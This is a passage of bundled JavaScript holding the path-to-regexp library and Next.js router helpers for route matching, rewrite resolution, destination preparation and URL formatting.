	        var open = tryConsume("OPEN");
	        if (open) {
	            var prefix = consumeText();
	            var name_1 = tryConsume("NAME") || "";
	            var pattern_1 = tryConsume("PATTERN") || "";
	            var suffix = consumeText();
	            mustConsume("CLOSE");
	            result.push({
	                name: name_1 || (pattern_1 ? key++ : ""),
	                pattern: name_1 && !pattern_1 ? defaultPattern : pattern_1,
	                prefix: prefix,
	                suffix: suffix,
	                modifier: tryConsume("MODIFIER") || ""
	            });
	            continue;
	        }
	        mustConsume("END");
	    }
	    return result;
	}
	pathToRegexp.parse = parse;
	/**
	 * Compile a string to a template function for the path.
	 */
	function compile(str, options) {
	    return tokensToFunction(parse(str, options), options);
	}
	pathToRegexp.compile = compile;
	/**
	 * Expose a method for transforming tokens into the path function.
	 */
	function tokensToFunction(tokens, options) {
	    if (options === void 0) { options = {}; }
	    var reFlags = flags(options);
	    var _a = options.encode, encode = _a === void 0 ? function (x) { return x; } : _a, _b = options.validate, validate = _b === void 0 ? true : _b;
	    // Compile all the tokens into regexps.
	    var matches = tokens.map(function (token) {
	        if (typeof token === "object") {
	            return new RegExp("^(?:" + token.pattern + ")$", reFlags);
	        }
	    });
	    return function (data) {
	        var path = "";
	        for (var i = 0; i < tokens.length; i++) {
	            var token = tokens[i];
	            if (typeof token === "string") {
	                path += token;
	                continue;
	            }
	            var value = data ? data[token.name] : undefined;
	            var optional = token.modifier === "?" || token.modifier === "*";
	            var repeat = token.modifier === "*" || token.modifier === "+";
	            if (Array.isArray(value)) {
	                if (!repeat) {
	                    throw new TypeError("Expected \"" + token.name + "\" to not repeat, but got an array");
	                }
	                if (value.length === 0) {
	                    if (optional)
	                        continue;
	                    throw new TypeError("Expected \"" + token.name + "\" to not be empty");
	                }
	                for (var j = 0; j < value.length; j++) {
	                    var segment = encode(value[j], token);
	                    if (validate && !matches[i].test(segment)) {
	                        throw new TypeError("Expected all \"" + token.name + "\" to match \"" + token.pattern + "\", but got \"" + segment + "\"");
	                    }
	                    path += token.prefix + segment + token.suffix;
	                }
	                continue;
	            }
	            if (typeof value === "string" || typeof value === "number") {
	                var segment = encode(String(value), token);
	                if (validate && !matches[i].test(segment)) {
	                    throw new TypeError("Expected \"" + token.name + "\" to match \"" + token.pattern + "\", but got \"" + segment + "\"");
	                }
	                path += token.prefix + segment + token.suffix;
	                continue;
	            }
	            if (optional)
	                continue;
	            var typeOfMessage = repeat ? "an array" : "a string";
	            throw new TypeError("Expected \"" + token.name + "\" to be " + typeOfMessage);
	        }
	        return path;
	    };
	}
	pathToRegexp.tokensToFunction = tokensToFunction;
	/**
	 * Create path match function from `path-to-regexp` spec.
	 */
	function match(str, options) {
	    var keys = [];
	    var re = pathToRegexp$1(str, keys, options);
	    return regexpToFunction(re, keys, options);
	}
	pathToRegexp.match = match;
	/**
	 * Create a path match function from `path-to-regexp` output.
	 */
	function regexpToFunction(re, keys, options) {
	    if (options === void 0) { options = {}; }
	    var _a = options.decode, decode = _a === void 0 ? function (x) { return x; } : _a;
	    return function (pathname) {
	        var m = re.exec(pathname);
	        if (!m)
	            return false;
	        var path = m[0], index = m.index;
	        var params = Object.create(null);
	        var _loop_1 = function (i) {
	            // tslint:disable-next-line
	            if (m[i] === undefined)
	                return "continue";
	            var key = keys[i - 1];
	            if (key.modifier === "*" || key.modifier === "+") {
	                params[key.name] = m[i].split(key.prefix + key.suffix).map(function (value) {
	                    return decode(value, key);
	                });
	            }
	            else {
	                params[key.name] = decode(m[i], key);
	            }
	        };
	        for (var i = 1; i < m.length; i++) {
	            _loop_1(i);
	        }
	        return { path: path, index: index, params: params };
	    };
	}
	pathToRegexp.regexpToFunction = regexpToFunction;
	/**
	 * Escape a regular expression string.
	 */
	function escapeString(str) {
	    return str.replace(/([.+*?=^!:${}()[\]|/\\])/g, "\\$1");
	}
	/**
	 * Get the flags for a regexp from the options.
	 */
	function flags(options) {
	    return options && options.sensitive ? "" : "i";
	}
	/**
	 * Pull out keys from a regexp.
	 */
	function regexpToRegexp(path, keys) {
	    if (!keys)
	        return path;
	    // Use a negative lookahead to match only capturing groups.
	    var groups = path.source.match(/\((?!\?)/g);
	    if (groups) {
	        for (var i = 0; i < groups.length; i++) {
	            keys.push({
	                name: i,
	                prefix: "",
	                suffix: "",
	                modifier: "",
	                pattern: ""
	            });
	        }
	    }
	    return path;
	}
	/**
	 * Transform an array into a regexp.
	 */
	function arrayToRegexp(paths, keys, options) {
	    var parts = paths.map(function (path) { return pathToRegexp$1(path, keys, options).source; });
	    return new RegExp("(?:" + parts.join("|") + ")", flags(options));
	}
	/**
	 * Create a path regexp from string input.
	 */
	function stringToRegexp(path, keys, options) {
	    return tokensToRegexp(parse(path, options), keys, options);
	}
	/**
	 * Expose a function for taking tokens and returning a RegExp.
	 */
	function tokensToRegexp(tokens, keys, options) {
	    if (options === void 0) { options = {}; }
	    var _a = options.strict, strict = _a === void 0 ? false : _a, _b = options.start, start = _b === void 0 ? true : _b, _c = options.end, end = _c === void 0 ? true : _c, _d = options.encode, encode = _d === void 0 ? function (x) { return x; } : _d;
	    var endsWith = "[" + escapeString(options.endsWith || "") + "]|$";
	    var delimiter = "[" + escapeString(options.delimiter || "/#?") + "]";
	    var route = start ? "^" : "";
	    // Iterate over the tokens and create our regexp string.
	    for (var _i = 0, tokens_1 = tokens; _i < tokens_1.length; _i++) {
	        var token = tokens_1[_i];
	        if (typeof token === "string") {
	            route += escapeString(encode(token));
	        }
	        else {
	            var prefix = escapeString(encode(token.prefix));
	            var suffix = escapeString(encode(token.suffix));
	            if (token.pattern) {
	                if (keys)
	                    keys.push(token);
	                if (prefix || suffix) {
	                    if (token.modifier === "+" || token.modifier === "*") {
	                        var mod = token.modifier === "*" ? "?" : "";
	                        route += "(?:" + prefix + "((?:" + token.pattern + ")(?:" + suffix + prefix + "(?:" + token.pattern + "))*)" + suffix + ")" + mod;
	                    }
	                    else {
	                        route += "(?:" + prefix + "(" + token.pattern + ")" + suffix + ")" + token.modifier;
	                    }
	                }
	                else {
	                    route += "(" + token.pattern + ")" + token.modifier;
	                }
	            }
	            else {
	                route += "(?:" + prefix + suffix + ")" + token.modifier;
	            }
	        }
	    }
	    if (end) {
	        if (!strict)
	            route += delimiter + "?";
	        route += !options.endsWith ? "$" : "(?=" + endsWith + ")";
	    }
	    else {
	        var endToken = tokens[tokens.length - 1];
	        var isEndDelimited = typeof endToken === "string"
	            ? delimiter.indexOf(endToken[endToken.length - 1]) > -1
	            : // tslint:disable-next-line
	                endToken === undefined;
	        if (!strict) {
	            route += "(?:" + delimiter + "(?=" + endsWith + "))?";
	        }
	        if (!isEndDelimited) {
	            route += "(?=" + delimiter + "|" + endsWith + ")";
	        }
	    }
	    return new RegExp(route, flags(options));
	}
	pathToRegexp.tokensToRegexp = tokensToRegexp;
	/**
	 * Normalize the given path string, returning a regular expression.
	 *
	 * An empty array can be passed in for the keys, which will hold the
	 * placeholder key descriptions. For example, using `/user/:id`, `keys` will
	 * contain `[{ name: 'id', delimiter: '/', optional: false, repeat: false }]`.
	 */
	function pathToRegexp$1(path, keys, options) {
	    if (path instanceof RegExp)
	        return regexpToRegexp(path, keys);
	    if (Array.isArray(path))
	        return arrayToRegexp(path, keys, options);
	    return stringToRegexp(path, keys, options);
	}
	pathToRegexp.pathToRegexp = pathToRegexp$1;
	
	return pathToRegexp;
}

var hasRequiredPathMatch;

function requirePathMatch () {
	if (hasRequiredPathMatch) return pathMatch;
	hasRequiredPathMatch = 1;
	Object.defineProperty(pathMatch, "__esModule", {
	    value: true
	});
	pathMatch.getPathMatch = getPathMatch;
	var _extends = /*@__PURE__*/ require_extends().default;
	var _pathToRegexp = requirePathToRegexp();
	function getPathMatch(path, options) {
	    const keys = [];
	    const regexp = (_pathToRegexp).pathToRegexp(path, keys, {
	        delimiter: '/',
	        sensitive: false,
	        strict: options == null ? void 0 : options.strict
	    });
	    const matcher = (_pathToRegexp).regexpToFunction((options == null ? void 0 : options.regexModifier) ? new RegExp(options.regexModifier(regexp.source), regexp.flags) : regexp, keys);
	    /**
	   * A matcher function that will check if a given pathname matches the path
	   * given in the builder function. When the path does not match it will return
	   * `false` but if it does it will return an object with the matched params
	   * merged with the params provided in the second argument.
	   */ return (pathname, params)=>{
	        const res = pathname == null ? false : matcher(pathname);
	        if (!res) {
	            return false;
	        }
	        /**
	     * If unnamed params are not allowed they must be removed from
	     * the matched parameters. path-to-regexp uses "string" for named and
	     * "number" for unnamed parameters.
	     */ if (options == null ? void 0 : options.removeUnnamedParams) {
	            for (const key of keys){
	                if (typeof key.name === 'number') {
	                    delete res.params[key.name];
	                }
	            }
	        }
	        return _extends({}, params, res.params);
	    };
	}

	
	return pathMatch;
}

var prepareDestination = {};

var escapeRegexp = {};

var hasRequiredEscapeRegexp;

function requireEscapeRegexp () {
	if (hasRequiredEscapeRegexp) return escapeRegexp;
	hasRequiredEscapeRegexp = 1;
	Object.defineProperty(escapeRegexp, "__esModule", {
	    value: true
	});
	escapeRegexp.escapeStringRegexp = escapeStringRegexp;
	// regexp is based on https://github.com/sindresorhus/escape-string-regexp
	const reHasRegExp = /[|\\{}()[\]^$+*?.-]/;
	const reReplaceRegExp = /[|\\{}()[\]^$+*?.-]/g;
	function escapeStringRegexp(str) {
	    // see also: https://github.com/lodash/lodash/blob/2da024c3b4f9947a48517639de7560457cd4ec6c/escapeRegExp.js#L23
	    if (reHasRegExp.test(str)) {
	        return str.replace(reReplaceRegExp, '\\$&');
	    }
	    return str;
	}

	
	return escapeRegexp;
}

var parseUrl = {};

var hasRequiredParseUrl;

function requireParseUrl () {
	if (hasRequiredParseUrl) return parseUrl;
	hasRequiredParseUrl = 1;
	Object.defineProperty(parseUrl, "__esModule", {
	    value: true
	});
	parseUrl.parseUrl = parseUrl$1;
	var _querystring = requireQuerystring();
	var _parseRelativeUrl = requireParseRelativeUrl();
	function parseUrl$1(url) {
	    if (url.startsWith('/')) {
	        return (_parseRelativeUrl).parseRelativeUrl(url);
	    }
	    const parsedURL = new URL(url);
	    return {
	        hash: parsedURL.hash,
	        hostname: parsedURL.hostname,
	        href: parsedURL.href,
	        pathname: parsedURL.pathname,
	        port: parsedURL.port,
	        protocol: parsedURL.protocol,
	        query: (_querystring).searchParamsToUrlQuery(parsedURL.searchParams),
	        search: parsedURL.search
	    };
	}

	
	return parseUrl;
}

var hasRequiredPrepareDestination;

function requirePrepareDestination () {
	if (hasRequiredPrepareDestination) return prepareDestination;
	hasRequiredPrepareDestination = 1;
	Object.defineProperty(prepareDestination, "__esModule", {
	    value: true
	});
	prepareDestination.matchHas = matchHas;
	prepareDestination.compileNonPath = compileNonPath;
	prepareDestination.prepareDestination = prepareDestination$1;
	var _extends = /*@__PURE__*/ require_extends().default;
	var _pathToRegexp = requirePathToRegexp();
	var _escapeRegexp = requireEscapeRegexp();
	var _parseUrl = requireParseUrl();
	/**
	 * Ensure only a-zA-Z are used for param names for proper interpolating
	 * with path-to-regexp
	 */ function getSafeParamName(paramName) {
	    let newParamName = '';
	    for(let i = 0; i < paramName.length; i++){
	        const charCode = paramName.charCodeAt(i);
	        if (charCode > 64 && charCode < 91 || charCode > 96 && charCode < 123 // a-z
	        ) {
	            newParamName += paramName[i];
	        }
	    }
	    return newParamName;
	}
	function escapeSegment(str, segmentName) {
	    return str.replace(new RegExp(`:${(_escapeRegexp).escapeStringRegexp(segmentName)}`, 'g'), `__ESC_COLON_${segmentName}`);
	}
	function unescapeSegments(str) {
	    return str.replace(/__ESC_COLON_/gi, ':');
	}
	function matchHas(req, query, has = [], missing = []) {
	    const params = {};
	    const hasMatch = (hasItem)=>{
	        let value;
	        let key = hasItem.key;
	        switch(hasItem.type){
	            case 'header':
	                {
	                    key = key.toLowerCase();
	                    value = req.headers[key];
	                    break;
	                }
	            case 'cookie':
	                {
	                    value = req.cookies[hasItem.key];
	                    break;
	                }
	            case 'query':
	                {
	                    value = query[key];
	                    break;
	                }
	            case 'host':
	                {
	                    const { host  } = (req == null ? void 0 : req.headers) || {};
	                    // remove port from host if present
	                    const hostname = host == null ? void 0 : host.split(':')[0].toLowerCase();
	                    value = hostname;
	                    break;
	                }
	        }
	        if (!hasItem.value && value) {
	            params[getSafeParamName(key)] = value;
	            return true;
	        } else if (value) {
	            const matcher = new RegExp(`^${hasItem.value}$`);
	            const matches = Array.isArray(value) ? value.slice(-1)[0].match(matcher) : value.match(matcher);
	            if (matches) {
	                if (Array.isArray(matches)) {
	                    if (matches.groups) {
	                        Object.keys(matches.groups).forEach((groupKey)=>{
	                            params[groupKey] = matches.groups[groupKey];
	                        });
	                    } else if (hasItem.type === 'host' && matches[0]) {
	                        params.host = matches[0];
	                    }
	                }
	                return true;
	            }
	        }
	        return false;
	    };
	    const allMatch = has.every((item)=>hasMatch(item)) && !missing.some((item)=>hasMatch(item));
	    if (allMatch) {
	        return params;
	    }
	    return false;
	}
	function compileNonPath(value, params) {
	    if (!value.includes(':')) {
	        return value;
	    }
	    for (const key of Object.keys(params)){
	        if (value.includes(`:${key}`)) {
	            value = value.replace(new RegExp(`:${key}\\*`, 'g'), `:${key}--ESCAPED_PARAM_ASTERISKS`).replace(new RegExp(`:${key}\\?`, 'g'), `:${key}--ESCAPED_PARAM_QUESTION`).replace(new RegExp(`:${key}\\+`, 'g'), `:${key}--ESCAPED_PARAM_PLUS`).replace(new RegExp(`:${key}(?!\\w)`, 'g'), `--ESCAPED_PARAM_COLON${key}`);
	        }
	    }
	    value = value.replace(/(:|\*|\?|\+|\(|\)|\{|\})/g, '\\$1').replace(/--ESCAPED_PARAM_PLUS/g, '+').replace(/--ESCAPED_PARAM_COLON/g, ':').replace(/--ESCAPED_PARAM_QUESTION/g, '?').replace(/--ESCAPED_PARAM_ASTERISKS/g, '*');
	    // the value needs to start with a forward-slash to be compiled
	    // correctly
	    return (_pathToRegexp).compile(`/${value}`, {
	        validate: false
	    })(params).slice(1);
	}
	function prepareDestination$1(args) {
	    const query = Object.assign({}, args.query);
	    delete query.__nextLocale;
	    delete query.__nextDefaultLocale;
	    delete query.__nextDataReq;
	    let escapedDestination = args.destination;
	    for (const param of Object.keys(_extends({}, args.params, query))){
	        escapedDestination = escapeSegment(escapedDestination, param);
	    }
	    const parsedDestination = (_parseUrl).parseUrl(escapedDestination);
	    const destQuery = parsedDestination.query;
	    const destPath = unescapeSegments(`${parsedDestination.pathname}${parsedDestination.hash || ''}`);
	    const destHostname = unescapeSegments(parsedDestination.hostname || '');
	    const destPathParamKeys = [];
	    const destHostnameParamKeys = [];
	    (_pathToRegexp).pathToRegexp(destPath, destPathParamKeys);
	    (_pathToRegexp).pathToRegexp(destHostname, destHostnameParamKeys);
	    const destParams = [];
	    destPathParamKeys.forEach((key)=>destParams.push(key.name));
	    destHostnameParamKeys.forEach((key)=>destParams.push(key.name));
	    const destPathCompiler = (_pathToRegexp).compile(destPath, // we don't validate while compiling the destination since we should
	    // have already validated before we got to this point and validating
	    // breaks compiling destinations with named pattern params from the source
	    // e.g. /something:hello(.*) -> /another/:hello is broken with validation
	    // since compile validation is meant for reversing and not for inserting
	    // params from a separate path-regex into another
	    {
	        validate: false
	    });
	    const destHostnameCompiler = (_pathToRegexp).compile(destHostname, {
	        validate: false
	    });
	    // update any params in query values
	    for (const [key1, strOrArray] of Object.entries(destQuery)){
	        // the value needs to start with a forward-slash to be compiled
	        // correctly
	        if (Array.isArray(strOrArray)) {
	            destQuery[key1] = strOrArray.map((value)=>compileNonPath(unescapeSegments(value), args.params));
	        } else {
	            destQuery[key1] = compileNonPath(unescapeSegments(strOrArray), args.params);
	        }
	    }
	    // add path params to query if it's not a redirect and not
	    // already defined in destination query or path
	    let paramKeys = Object.keys(args.params).filter((name)=>name !== 'nextInternalLocale');
	    if (args.appendParamsToQuery && !paramKeys.some((key)=>destParams.includes(key))) {
	        for (const key of paramKeys){
	            if (!(key in destQuery)) {
	                destQuery[key] = args.params[key];
	            }
	        }
	    }
	    let newUrl;
	    try {
	        newUrl = destPathCompiler(args.params);
	        const [pathname, hash] = newUrl.split('#');
	        parsedDestination.hostname = destHostnameCompiler(args.params);
	        parsedDestination.pathname = pathname;
	        parsedDestination.hash = `${hash ? '#' : ''}${hash || ''}`;
	        delete parsedDestination.search;
	    } catch (err) {
	        if (err.message.match(/Expected .*? to not repeat, but got an array/)) {
	            throw new Error(`To use a multi-match in the destination you must add \`*\` at the end of the param name to signify it should repeat. https://nextjs.org/docs/messages/invalid-multi-match`);
	        }
	        throw err;
	    }
	    // Query merge order lowest priority to highest
	    // 1. initial URL query values
	    // 2. path segment values
	    // 3. destination specified query values
	    parsedDestination.query = _extends({}, query, parsedDestination.query);
	    return {
	        newUrl,
	        destQuery,
	        parsedDestination
	    };
	}

	
	return prepareDestination;
}

var removeBasePath = {exports: {}};

var hasBasePath = {exports: {}};

var pathHasPrefix = {};

var hasRequiredPathHasPrefix;

function requirePathHasPrefix () {
	if (hasRequiredPathHasPrefix) return pathHasPrefix;
	hasRequiredPathHasPrefix = 1;
	Object.defineProperty(pathHasPrefix, "__esModule", {
	    value: true
	});
	pathHasPrefix.pathHasPrefix = pathHasPrefix$1;
	var _parsePath = requireParsePath();
	function pathHasPrefix$1(path, prefix) {
	    if (typeof path !== 'string') {
	        return false;
	    }
	    const { pathname  } = (_parsePath).parsePath(path);
	    return pathname === prefix || pathname.startsWith(prefix + '/');
	}

	
	return pathHasPrefix;
}

var hasRequiredHasBasePath;

function requireHasBasePath () {
	if (hasRequiredHasBasePath) return hasBasePath.exports;
	hasRequiredHasBasePath = 1;
	(function (module, exports) {
		Object.defineProperty(exports, "__esModule", {
		    value: true
		});
		exports.hasBasePath = hasBasePath;
		var _pathHasPrefix = requirePathHasPrefix();
		const basePath = process.env.__NEXT_ROUTER_BASEPATH || '';
		function hasBasePath(path) {
		    return (_pathHasPrefix).pathHasPrefix(path, basePath);
		}

		if ((typeof exports.default === 'function' || (typeof exports.default === 'object' && exports.default !== null)) && typeof exports.default.__esModule === 'undefined') {
		  Object.defineProperty(exports.default, '__esModule', { value: true });
		  Object.assign(exports.default, exports);
		  module.exports = exports.default;
		}

		
	} (hasBasePath, hasBasePath.exports));
	return hasBasePath.exports;
}

var hasRequiredRemoveBasePath;

function requireRemoveBasePath () {
	if (hasRequiredRemoveBasePath) return removeBasePath.exports;
	hasRequiredRemoveBasePath = 1;
	(function (module, exports) {
		Object.defineProperty(exports, "__esModule", {
		    value: true
		});
		exports.removeBasePath = removeBasePath;
		var _hasBasePath = requireHasBasePath();
		const basePath = process.env.__NEXT_ROUTER_BASEPATH || '';
		function removeBasePath(path) {
		    if (process.env.__NEXT_MANUAL_CLIENT_BASE_PATH) {
		        if (!(_hasBasePath).hasBasePath(path)) {
		            return path;
		        }
		    }
		    path = path.slice(basePath.length);
		    if (!path.startsWith('/')) path = `/${path}`;
		    return path;
		}

		if ((typeof exports.default === 'function' || (typeof exports.default === 'object' && exports.default !== null)) && typeof exports.default.__esModule === 'undefined') {
		  Object.defineProperty(exports.default, '__esModule', { value: true });
		  Object.assign(exports.default, exports);
		  module.exports = exports.default;
		}

		
	} (removeBasePath, removeBasePath.exports));
	return removeBasePath.exports;
}

var hasRequiredResolveRewrites;

function requireResolveRewrites () {
	if (hasRequiredResolveRewrites) return resolveRewrites;
	hasRequiredResolveRewrites = 1;
	Object.defineProperty(resolveRewrites, "__esModule", {
	    value: true
	});
	resolveRewrites.default = resolveRewrites$1;
	var _pathMatch = requirePathMatch();
	var _prepareDestination = requirePrepareDestination();
	var _removeTrailingSlash = requireRemoveTrailingSlash();
	var _normalizeLocalePath = requireNormalizeLocalePath$1();
	var _removeBasePath = requireRemoveBasePath();
	var _parseRelativeUrl = requireParseRelativeUrl();
	function resolveRewrites$1(asPath, pages, rewrites, query, resolveHref, locales) {
	    let matchedPage = false;
	    let externalDest = false;
	    let parsedAs = (_parseRelativeUrl).parseRelativeUrl(asPath);
	    let fsPathname = (_removeTrailingSlash).removeTrailingSlash((_normalizeLocalePath).normalizeLocalePath((_removeBasePath).removeBasePath(parsedAs.pathname), locales).pathname);
	    let resolvedHref;
	    const handleRewrite = (rewrite)=>{
	        const matcher = (_pathMatch).getPathMatch(rewrite.source + (process.env.__NEXT_TRAILING_SLASH ? '(/)?' : ''), {
	            removeUnnamedParams: true,
	            strict: true
	        });
	        let params = matcher(parsedAs.pathname);
	        if ((rewrite.has || rewrite.missing) && params) {
	            const hasParams = (_prepareDestination).matchHas({
	                headers: {
	                    host: document.location.hostname
	                },
	                cookies: document.cookie.split('; ').reduce((acc, item)=>{
	                    const [key, ...value] = item.split('=');
	                    acc[key] = value.join('=');
	                    return acc;
	                }, {})
	            }, parsedAs.query, rewrite.has, rewrite.missing);
	            if (hasParams) {
	                Object.assign(params, hasParams);
	            } else {
	                params = false;
	            }
	        }
	        if (params) {
	            if (!rewrite.destination) {
	                // this is a proxied rewrite which isn't handled on the client
	                externalDest = true;
	                return true;
	            }
	            const destRes = (_prepareDestination).prepareDestination({
	                appendParamsToQuery: true,
	                destination: rewrite.destination,
	                params: params,
	                query: query
	            });
	            parsedAs = destRes.parsedDestination;
	            asPath = destRes.newUrl;
	            Object.assign(query, destRes.parsedDestination.query);
	            fsPathname = (_removeTrailingSlash).removeTrailingSlash((_normalizeLocalePath).normalizeLocalePath((_removeBasePath).removeBasePath(asPath), locales).pathname);
	            if (pages.includes(fsPathname)) {
	                // check if we now match a page as this means we are done
	                // resolving the rewrites
	                matchedPage = true;
	                resolvedHref = fsPathname;
	                return true;
	            }
	            // check if we match a dynamic-route, if so we break the rewrites chain
	            resolvedHref = resolveHref(fsPathname);
	            if (resolvedHref !== asPath && pages.includes(resolvedHref)) {
	                matchedPage = true;
	                return true;
	            }
	        }
	    };
	    let finished = false;
	    for(let i = 0; i < rewrites.beforeFiles.length; i++){
	        // we don't end after match in beforeFiles to allow
	        // continuing through all beforeFiles rewrites
	        handleRewrite(rewrites.beforeFiles[i]);
	    }
	    matchedPage = pages.includes(fsPathname);
	    if (!matchedPage) {
	        if (!finished) {
	            for(let i = 0; i < rewrites.afterFiles.length; i++){
	                if (handleRewrite(rewrites.afterFiles[i])) {
	                    finished = true;
	                    break;
	                }
	            }
	        }
	        // check dynamic route before processing fallback rewrites
	        if (!finished) {
	            resolvedHref = resolveHref(fsPathname);
	            matchedPage = pages.includes(resolvedHref);
	            finished = matchedPage;
	        }
	        if (!finished) {
	            for(let i = 0; i < rewrites.fallback.length; i++){
	                if (handleRewrite(rewrites.fallback[i])) {
	                    finished = true;
	                    break;
	                }
	            }
	        }
	    }
	    return {
	        asPath,
	        parsedAs,
	        matchedPage,
	        resolvedHref,
	        externalDest
	    };
	}

	
	return resolveRewrites;
}

var routeMatcher = {};

var hasRequiredRouteMatcher;

function requireRouteMatcher () {
	if (hasRequiredRouteMatcher) return routeMatcher;
	hasRequiredRouteMatcher = 1;
	Object.defineProperty(routeMatcher, "__esModule", {
	    value: true
	});
	routeMatcher.getRouteMatcher = getRouteMatcher;
	var _utils = requireUtils$1();
	function getRouteMatcher({ re , groups  }) {
	    return (pathname)=>{
	        const routeMatch = re.exec(pathname);
	        if (!routeMatch) {
	            return false;
	        }
	        const decode = (param)=>{
	            try {
	                return decodeURIComponent(param);
	            } catch (_) {
	                throw new _utils.DecodeError('failed to decode param');
	            }
	        };
	        const params = {};
	        Object.keys(groups).forEach((slugName)=>{
	            const g = groups[slugName];
	            const m = routeMatch[g.pos];
	            if (m !== undefined) {
	                params[slugName] = ~m.indexOf('/') ? m.split('/').map((entry)=>decode(entry)) : g.repeat ? [
	                    decode(m)
	                ] : decode(m);
	            }
	        });
	        return params;
	    };
	}

	
	return routeMatcher;
}

var routeRegex = {};

var hasRequiredRouteRegex;

function requireRouteRegex () {
	if (hasRequiredRouteRegex) return routeRegex;
	hasRequiredRouteRegex = 1;
	Object.defineProperty(routeRegex, "__esModule", {
	    value: true
	});
	routeRegex.getRouteRegex = getRouteRegex;
	routeRegex.getNamedRouteRegex = getNamedRouteRegex;
	routeRegex.getNamedMiddlewareRegex = getNamedMiddlewareRegex;
	var _extends = /*@__PURE__*/ require_extends().default;
	var _escapeRegexp = requireEscapeRegexp();
	var _removeTrailingSlash = requireRemoveTrailingSlash();
	/**
	 * Parses a given parameter from a route to a data structure that can be used
	 * to generate the parametrized route. Examples:
	 *   - `[...slug]` -> `{ name: 'slug', repeat: true, optional: true }`
	 *   - `[foo]` -> `{ name: 'foo', repeat: false, optional: true }`
	 *   - `bar` -> `{ name: 'bar', repeat: false, optional: false }`
	 */ function parseParameter(param) {
	    const optional = param.startsWith('[') && param.endsWith(']');
	    if (optional) {
	        param = param.slice(1, -1);
	    }
	    const repeat = param.startsWith('...');
	    if (repeat) {
	        param = param.slice(3);
	    }
	    return {
	        key: param,
	        repeat,
	        optional
	    };
	}
	function getParametrizedRoute(route) {
	    const segments = (_removeTrailingSlash).removeTrailingSlash(route).slice(1).split('/');
	    const groups = {};
	    let groupIndex = 1;
	    return {
	        parameterizedRoute: segments.map((segment)=>{
	            if (segment.startsWith('[') && segment.endsWith(']')) {
	                const { key , optional , repeat  } = parseParameter(segment.slice(1, -1));
	                groups[key] = {
	                    pos: groupIndex++,
	                    repeat,
	                    optional
	                };
	                return repeat ? optional ? '(?:/(.+?))?' : '/(.+?)' : '/([^/]+?)';
	            } else {
	                return `/${(_escapeRegexp).escapeStringRegexp(segment)}`;
	            }
	        }).join(''),
	        groups
	    };
	}
	function getRouteRegex(normalizedRoute) {
	    const { parameterizedRoute , groups  } = getParametrizedRoute(normalizedRoute);
	    return {
	        re: new RegExp(`^${parameterizedRoute}(?:/)?$`),
	        groups: groups
	    };
	}
	/**
	 * Builds a function to generate a minimal routeKey using only a-z and minimal
	 * number of characters.
	 */ function buildGetSafeRouteKey() {
	    let routeKeyCharCode = 97;
	    let routeKeyCharLength = 1;
	    return ()=>{
	        let routeKey = '';
	        for(let i = 0; i < routeKeyCharLength; i++){
	            routeKey += String.fromCharCode(routeKeyCharCode);
	            routeKeyCharCode++;
	            if (routeKeyCharCode > 122) {
	                routeKeyCharLength++;
	                routeKeyCharCode = 97;
	            }
	        }
	        return routeKey;
	    };
	}
	function getNamedParametrizedRoute(route) {
	    const segments = (_removeTrailingSlash).removeTrailingSlash(route).slice(1).split('/');
	    const getSafeRouteKey = buildGetSafeRouteKey();
	    const routeKeys = {};
	    return {
	        namedParameterizedRoute: segments.map((segment)=>{
	            if (segment.startsWith('[') && segment.endsWith(']')) {
	                const { key , optional , repeat  } = parseParameter(segment.slice(1, -1));
	                // replace any non-word characters since they can break
	                // the named regex
	                let cleanedKey = key.replace(/\W/g, '');
	                let invalidKey = false;
	                // check if the key is still invalid and fallback to using a known
	                // safe key
	                if (cleanedKey.length === 0 || cleanedKey.length > 30) {
	                    invalidKey = true;
	                }
	                if (!isNaN(parseInt(cleanedKey.slice(0, 1)))) {
	                    invalidKey = true;
	                }
	                if (invalidKey) {
	                    cleanedKey = getSafeRouteKey();
	                }
	                routeKeys[cleanedKey] = key;
	                return repeat ? optional ? `(?:/(?<${cleanedKey}>.+?))?` : `/(?<${cleanedKey}>.+?)` : `/(?<${cleanedKey}>[^/]+?)`;
	            } else {
	                return `/${(_escapeRegexp).escapeStringRegexp(segment)}`;
	            }
	        }).join(''),
	        routeKeys
	    };
	}
	function getNamedRouteRegex(normalizedRoute) {
	    const result = getNamedParametrizedRoute(normalizedRoute);
	    return _extends({}, getRouteRegex(normalizedRoute), {
	        namedRegex: `^${result.namedParameterizedRoute}(?:/)?$`,
	        routeKeys: result.routeKeys
	    });
	}
	function getNamedMiddlewareRegex(normalizedRoute, options) {
	    const { parameterizedRoute  } = getParametrizedRoute(normalizedRoute);
	    const { catchAll =true  } = options;
	    if (parameterizedRoute === '/') {
	        let catchAllRegex = catchAll ? '.*' : '';
	        return {
	            namedRegex: `^/${catchAllRegex}$`
	        };
	    }
	    const { namedParameterizedRoute  } = getNamedParametrizedRoute(normalizedRoute);
	    let catchAllGroupedRegex = catchAll ? '(?:(/.*)?)' : '';
	    return {
	        namedRegex: `^${namedParameterizedRoute}${catchAllGroupedRegex}$`
	    };
	}

	
	return routeRegex;
}

var formatUrl = {};

var hasRequiredFormatUrl;

function requireFormatUrl () {
	if (hasRequiredFormatUrl) return formatUrl;
	hasRequiredFormatUrl = 1;
	Object.defineProperty(formatUrl, "__esModule", {
	    value: true
	});
	formatUrl.formatUrl = formatUrl$1;
	formatUrl.formatWithValidation = formatWithValidation;
	formatUrl.urlObjectKeys = void 0;
	var _interop_require_wildcard = /*@__PURE__*/ require_interop_require_wildcard().default;
	var querystring = _interop_require_wildcard(requireQuerystring());
	const slashedProtocols = /https?|ftp|gopher|file/;
	function formatUrl$1(urlObj) {
	    let { auth , hostname  } = urlObj;
	    let protocol = urlObj.protocol || '';
	    let pathname = urlObj.pathname || '';
	    let hash = urlObj.hash || '';
	    let query = urlObj.query || '';
	    let host = false;
	    auth = auth ? encodeURIComponent(auth).replace(/%3A/i, ':') + '@' : '';
	    if (urlObj.host) {
	        host = auth + urlObj.host;
	    } else if (hostname) {
	        host = auth + (~hostname.indexOf(':') ? `[${hostname}]` : hostname);
	        if (urlObj.port) {
	            host += ':' + urlObj.port;
	        }
	    }
	    if (query && typeof query === 'object') {
	        query = String(querystring.urlQueryToSearchParams(query));
	    }
	    let search = urlObj.search || query && `?${query}` || '';
	    if (protocol && !protocol.endsWith(':')) protocol += ':';
	    if (urlObj.slashes || (!protocol || slashedProtocols.test(protocol)) && host !== false) {
	        host = '//' + (host || '');
	        if (pathname && pathname[0] !== '/') pathname = '/' + pathname;
	    } else if (!host) {
	        host = '';
	    }
	    if (hash && hash[0] !== '#') hash = '#' + hash;
	    if (search && search[0] !== '?') search = '?' + search;
